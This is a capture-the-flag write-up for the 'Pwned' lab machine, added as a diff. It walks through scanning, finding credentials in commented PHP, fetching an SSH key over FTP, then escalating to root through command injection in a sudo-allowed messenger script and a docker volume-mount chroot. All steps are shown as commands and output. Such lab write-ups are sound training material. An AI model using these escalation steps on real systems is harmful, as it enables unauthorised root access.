@@ -1,0 +1,455 @@
+# Pwned Writeup #
+
+
+--> Discovering Ip <--
+
+arp-scan -l | grep "PCS" | awk '{print "\n[-] " $1}'
+
+[-] 10.0.2.3
+
+[-] 10.0.2.48
+
+
+--> NMAP Port Scanning <--
+
+nmap -p- -A -sCV 10.0.2.48
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-18 18:19 +03
+Nmap scan report for 10.0.2.48
+Host is up (0.00028s latency).
+Not shown: 65532 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 fe:cd:90:19:74:91:ae:f5:64:a8:a5:e8:6f:6e:ef:7e (RSA)
+|   256 81:32:93:bd:ed:9b:e7:98:af:25:06:79:5f:de:91:5d (ECDSA)
+|_  256 dd:72:74:5d:4d:2d:a3:62:3e:81:af:09:51:e0:14:4a (ED25519)
+80/tcp open  http    Apache httpd 2.4.38 ((Debian))
+|_http-title: Pwned....!!
+|_http-server-header: Apache/2.4.38 (Debian)
+MAC Address: 08:00:27:AD:38:46 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.6
+Network Distance: 1 hop
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.28 ms 10.0.2.48
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 11.27 seconds
+zsh: segmentation fault  nmap -p- -A -sCV 10.0.2.48
+
+
+--> Checking the Website <--
+view-source:http://10.0.2.48
+
+
+<!DOCTYPE html>
+<html>
+<head>
+<title>Pwned....!!</title>
+</head>
+<body>
+
+<h1>  vanakam nanba (Hello friend) </h1>
+<p></p>
+
+<p> 
+<pre>    
+
+
+     
+                                                                                                                 dddddddd
+  PPPPPPPPPPPPPPPPP                                                                                              d::::::d
+  P::::::::::::::::P                                                                                             d::::::d
+  P::::::PPPPPP:::::P                                                                                            d::::::d
+  PP:::::P     P:::::P                                                                                           d:::::d 
+    P::::P     P:::::Pwwwwwww           wwwww           wwwwwwwnnnn  nnnnnnnn        eeeeeeeeeeee        ddddddddd:::::d 
+    P::::P     P:::::P w:::::w         w:::::w         w:::::w n:::nn::::::::nn    ee::::::::::::ee    dd::::::::::::::d 
+    P::::PPPPPP:::::P   w:::::w       w:::::::w       w:::::w  n::::::::::::::nn  e::::::eeeee:::::ee d::::::::::::::::d 
+    P:::::::::::::PP     w:::::w     w:::::::::w     w:::::w   nn:::::::::::::::ne::::::e     e:::::ed:::::::ddddd:::::d 
+    P::::PPPPPPPPP        w:::::w   w:::::w:::::w   w:::::w      n:::::nnnn:::::ne:::::::eeeee::::::ed::::::d    d:::::d 
+    P::::P                 w:::::w w:::::w w:::::w w:::::w       n::::n    n::::ne:::::::::::::::::e d:::::d     d:::::d 
+    P::::P                  w:::::w:::::w   w:::::w:::::w        n::::n    n::::ne::::::eeeeeeeeeee  d:::::d     d:::::d 
+    P::::P                   w:::::::::w     w:::::::::w         n::::n    n::::ne:::::::e           d:::::d     d:::::d 
+  PP::::::PP                  w:::::::w       w:::::::w          n::::n    n::::ne::::::::e          d::::::ddddd::::::dd
+  P::::::::P                   w:::::w         w:::::w           n::::n    n::::n e::::::::eeeeeeee   d:::::::::::::::::d
+  P::::::::P                    w:::w           w:::w            n::::n    n::::n  ee:::::::::::::e    d:::::::::ddd::::d
+  PPPPPPPPPP                     www             www             nnnnnn    nnnnnn    eeeeeeeeeeeeee     ddddddddd   ddddd
+                                                                           
+                                                                                                                     
+                                                                                                                       
+          
+
+        A last note from Attacker :)
+
+                   I am Annlynn. I am the hacker hacked your server with your employees but they don't know how i used them. 
+                   Now they worry about this. Before finding me investigate your employees first. (LOL) then find me Boomers XD..!!
+
+ 
+            </pre>
+ </p>
+
+</body>
+</html> 
+
+
+-->we also manage to find a secret note in the source codes 
+<!-- I forgot to add this on last note
+     You are pretty smart as i thought 
+     so here i left it for you 
+     She sings very well. l loved it  -->
+     
+     
+ --> Gobuster Scan <--
+ 
+ gobuster dir -u http://10.0.2.48 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x html,php,txt,jpeg,css
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.0.2.48
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Extensions:              jpeg,css,html,php,txt
+[+] Timeout:                 10s
+===============================================================
+2022/09/18 18:22:50 Starting gobuster in directory enumeration mode
+===============================================================
+/index.html           (Status: 200) [Size: 3065]
+/robots.txt           (Status: 200) [Size: 41]  
+/nothing              (Status: 301) [Size: 308] [--> http://10.0.2.48/nothing/]
+/server-status        (Status: 403) [Size: 274]                                
+/hidden_text          (Status: 301) [Size: 312] [--> http://10.0.2.48/hidden_text/]
+                                                                                   
+===============================================================
+2022/09/18 18:24:38 Finished
+===============================================================
+
+--> Than we checked all the files and we can clearly find the seccret_text has something different for us in here
+http://10.0.2.48/hidden_text/secret.dic show us this
+
+/hacked
+/vanakam_nanba
+/hackerman.gif 
+/facebook
+/whatsapp
+/instagram
+/pwned
+/pwned.com
+/pubg 
+/cod
+/fortnite
+/youtube
+/kali.org
+/hacked.vuln
+/users.vuln
+/passwd.vuln
+/pwned.vuln
+/backup.vuln
+/.ssh
+/root
+/home
+
+--> We downloaded the secret.dic and got it into our computer
+wget http://10.0.2.48/hidden_text/secret.dic
+
+--> And we used Gobuster again with secret.dic for scanning
+
+gobuster dir -u http://10.0.2.48 -w secret.dic -x html,php,txt,jpeg,css 
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.0.2.48
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                secret.dic
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Extensions:              css,html,php,txt,jpeg
+[+] Timeout:                 10s
+===============================================================
+2022/09/18 18:28:50 Starting gobuster in directory enumeration mode
+===============================================================
+//pwned.vuln          (Status: 301) [Size: 311] [--> http://10.0.2.48/pwned.vuln/]
+                                                                                  
+===============================================================
+2022/09/18 18:28:50 Finished
+===============================================================
+
+--> Than we went to the site 
+http://10.0.2.48/pwned.vuln/
+view-source:http://10.0.2.48/pwned.vuln/
+
+<!DOCTYPE html>
+<html>
+<head> 
+	<title>login</title>
+</head>
+<body>
+		<div id="main">
+			<h1> vanakam nanba. I hacked your login page too with advanced hacking method</h1>
+			<form method="POST">
+			Username <input type="text" name="username" class="text" autocomplete="off" required>
+			Password <input type="password" name="password" class="text" required>
+			<input type="submit" name="submit" id="sub">
+			</form>
+			</div>
+</body>
+</html>
+
+
+
+
+<?php
+//	if (isset($_POST['submit'])) {
+//		$un=$_POST['username'];
+//		$pw=$_POST['password'];
+//
+//	if ($un=='ftpuser' && $pw=='B0ss_B!TcH') {
+//		echo "welcome"
+//		exit();
+// }
+// else 
+//	echo "Invalid creds"
+// }
+?>
+
+--> These were in fact credentials for ftp server and we loged into ftp 
+
+ftp 10.0.2.48
+Connected to 10.0.2.48.
+220 (vsFTPd 3.0.3)
+Name (10.0.2.48:seraph): ftpuser
+331 Please specify the password.
+Password: 
+230 Login successful.
+Remote system type is UNIX.
+ftp> ls -la
+229 Entering Extended Passive Mode (|||42049|)
+150 Here comes the directory listing.
+drwxrwxrwx    3 0        0            4096 Jul 09  2020 .
+drwxr-xr-x    5 0        0            4096 Jul 10  2020 ..
+drwxr-xr-x    2 0        0            4096 Jul 10  2020 share
+226 Directory send OK.
+ftp> cd share
+250 Directory successfully changed.
+ftp> ls -la
+229 Entering Extended Passive Mode (|||51245|)
+150 Here comes the directory listing.
+drwxr-xr-x    2 0        0            4096 Jul 10  2020 .
+drwxrwxrwx    3 0        0            4096 Jul 09  2020 ..
+-rw-r--r--    1 0        0            2602 Jul 09  2020 id_rsa
+-rw-r--r--    1 0        0              75 Jul 09  2020 note.txt
+226 Directory send OK.
+ftp> get id_rsa
+local: id_rsa remote: id_rsa
+229 Entering Extended Passive Mode (|||43961|)
+150 Opening BINARY mode data connection for id_rsa (2602 bytes).
+100% |*******************************************************************|  2602        2.50 MiB/s    00:00 ETA
+226 Transfer complete.
+ftp> get note.txt
+local: note.txt remote: note.txt
+229 Entering Extended Passive Mode (|||43961|)
+150 Opening BINARY mode data connection for note.txt (2602 bytes).
+100% |*******************************************************************|  2602        2.50 MiB/s    00:00 ETA
+226 Transfer complete.
+
+--> Read the note.txt  and you will see 
+Wow you are here ariana won't happy about this note sorry ariana :(
+
+
+--> Giving permission to id_rsa <--
+
+chmod 600 id_rsa
+
+
+--> SSH login with id_rsa <--
+
+ssh -i id_rsa ariana@10.0.2.48
+Linux pwned 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Sun Sep 18 21:09:08 2022 from 10.0.2.32
+ariana@pwned:~$ whoami
+ariana
+ariana@pwned:~$ id 
+uid=1000(ariana) gid=1000(ariana) groups=1000(ariana),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth)
+ariana@pwned:~$ hostname
+pwned
+ariana@pwned:~$ ls -la
+total 40
+drwxrwx--- 4 ariana ariana 4096 Jul 10  2020 .
+drwxr-xr-x 5 root   root   4096 Jul 10  2020 ..
+-rw-r--r-- 1 ariana ariana  142 Jul 10  2020 ariana-personal.diary
+-rw------- 1 ariana ariana    4 Jul 10  2020 .bash_history
+-rw-r--r-- 1 ariana ariana  220 Jul  4  2020 .bash_logout
+-rw-r--r-- 1 ariana ariana 3526 Jul  4  2020 .bashrc
+drwxr-xr-x 3 ariana ariana 4096 Jul  6  2020 .local
+-rw-r--r-- 1 ariana ariana  807 Jul  4  2020 .profile
+drwx------ 2 ariana ariana 4096 Jul  9  2020 .ssh
+-rw-r--r-- 1 ariana ariana  143 Jul 10  2020 user1.txt
+ariana@pwned:~$ cat user1.txt
+congratulations you Pwned ariana 
+
+Here is your user flag ↓↓↓↓↓↓↓
+
+******************************* <-- User1 flag  will be here
+
+Try harder.need become root
+ariana@pwned:~$ sudo -l 
+Matching Defaults entries for ariana on pwned:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User ariana may run the following commands on pwned:
+    (selena) NOPASSWD: /home/messenger.sh
+ariana@pwned:~$ cd /home
+ariana@pwned:/home$ ls -al
+total 24
+drwxr-xr-x  5 root   root   4096 Jul 10  2020 .
+drwxr-xr-x 18 root   root   4096 Jul  6  2020 ..
+drwxrwx---  4 ariana ariana 4096 Jul 10  2020 ariana
+drwxrwxrwx  3 root   root   4096 Jul  9  2020 ftpuser
+-rwxr-xr-x  1 root   root    367 Jul 10  2020 messenger.sh
+drwxrwx---  3 selena root   4096 Jul 10  2020 selena
+ariana@pwned:/home$ cat /home/messenger.sh
+#!/bin/bash
+
+clear
+echo "Welcome to linux.messenger "
+		echo ""
+users=$(cat /etc/passwd | grep home |  cut -d/ -f 3)
+		echo ""
+echo "$users"
+		echo ""
+read -p "Enter username to send message : " name 
+		echo ""
+read -p "Enter message for $name :" msg
+		echo ""
+echo "Sending message to $name "
+
+$msg 2> /dev/null
+
+		echo ""
+echo "Message sent to $name :) "
+		echo ""
+
+
+--> Privilege Escalation <--
+
+ariana@pwned:sudo -u selena /home/messenger.sh
+
+
+--> In messenger.sh we got in
+
+Welcome to linux.messenger 
+
+
+ariana:
+selena:
+ftpuser:
+
+Enter username to send message : /bin/bash
+
+Enter message for /bin/bash :/bin/bash
+
+Sending message to /bin/bash 
+whoami
+selena
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+selena@pwned:/home$ ls -la
+total 24
+drwxr-xr-x  5 root   root   4096 Jul 10  2020 .
+drwxr-xr-x 18 root   root   4096 Jul  6  2020 ..
+drwxrwx---  4 ariana ariana 4096 Jul 10  2020 ariana
+drwxrwxrwx  3 root   root   4096 Jul  9  2020 ftpuser
+-rwxr-xr-x  1 root   root    367 Jul 10  2020 messenger.sh
+drwxrwx---  3 selena root   4096 Jul 10  2020 selena
+selena@pwned:/home$ cd selena
+selena@pwned:~$ ls
+selena-personal.diary  user2.txt
+selena@pwned:~$ cat selena-personal.diary
+Its Selena personal Diary :::
+
+Today Ariana fight with me for Ajay. so i left her ssh key on FTP. now she resposible for the leak.
+
+selena@pwned:~$ cat user2.txt
+7************************************ <-- User2 flag will be here
+
+You are near to me. you found selena too.
+
+Try harder to catch me
+selena@pwned:~$ id
+
+uid=1001(selena) gid=1001(selena) groups=1001(selena),115(docker)
+--> In here we saw the docker and https://gtfobins.github.io/gtfobins/docker/ used this side the use the Docker shell
+
+selena@pwned:~$ docker run -v /:/mnt --rm -it alpine chroot /mnt bash
+
+root@d60ab514103a:/# ls -la
+total 277
+drwxr-xr-x  18 root root   4096 Jul  6  2020 .
+drwxr-xr-x  18 root root   4096 Jul  6  2020 ..
+lrwxrwxrwx   1 root root      7 Jul  4  2020 bin -> usr/bin
+drwxr-xr-x   4 root root   1024 Jul  4  2020 boot
+-rw-------   1 root root 360448 Jul  6  2020 core
+drwxr-xr-x  18 root root   3240 Sep 18 20:46 dev
+drwxr-xr-x  76 root root   4096 Sep 18 21:17 etc
+drwxr-xr-x   5 root root   4096 Jul 10  2020 home
+lrwxrwxrwx   1 root root     30 Jul  4  2020 initrd.img -> boot/initrd.img-4.19.0-9-amd64
+lrwxrwxrwx   1 root root     30 Jul  4  2020 initrd.img.old -> boot/initrd.img-4.19.0-9-amd64
+lrwxrwxrwx   1 root root      7 Jul  4  2020 lib -> usr/lib
+lrwxrwxrwx   1 root root      9 Jul  4  2020 lib32 -> usr/lib32
+lrwxrwxrwx   1 root root      9 Jul  4  2020 lib64 -> usr/lib64
+lrwxrwxrwx   1 root root     10 Jul  4  2020 libx32 -> usr/libx32
+drwx------   2 root root  16384 Jul  4  2020 lost+found
+drwxr-xr-x   3 root root   4096 Jul  4  2020 media
+drwxr-xr-x   2 root root   4096 Jul  4  2020 mnt
+drwxr-xr-x   3 root root   4096 Jul  6  2020 opt
+dr-xr-xr-x 105 root root      0 Sep 18 20:46 proc
+drwx------   3 root root   4096 Jul 10  2020 root
+drwxr-xr-x  21 root root    680 Sep 18 21:13 run
+lrwxrwxrwx   1 root root      8 Jul  4  2020 sbin -> usr/sbin
+drwxr-xr-x   3 root root   4096 Jul  9  2020 srv
+dr-xr-xr-x  13 root root      0 Sep 18 20:45 sys
+drwxrwxrwt   9 root root   4096 Sep 18 21:18 tmp
+drwxr-xr-x  13 root root   4096 Jul  4  2020 usr
+drwxr-xr-x  12 root root   4096 Jul  4  2020 var
+lrwxrwxrwx   1 root root     27 Jul  4  2020 vmlinuz -> boot/vmlinuz-4.19.0-9-amd64
+lrwxrwxrwx   1 root root     27 Jul  4  2020 vmlinuz.old -> boot/vmlinuz-4.19.0-9-amd64
+
+root@d60ab514103a:/# cat /root/root.txt
+
+****************************************** <-- Root flag will be here
+
+You found me. i dont't expect this （◎ . ◎）
+
+I am Ajay (Annlynn) i hacked your server left and this for you.
+
+I trapped Ariana and Selena to takeover your server :)
+
+
+You Pwned the Pwned congratulations :)
+
+share the screen shot or flags to given contact details for confirmation 
+
+Telegram   https://t.me/joinchat/NGcyGxOl5slf7_Xt0kTr7g
+
+Instgarm   ajs_walker 
+
+Twitter    Ajs_walker 
+root@d60ab514103a:/# 
+
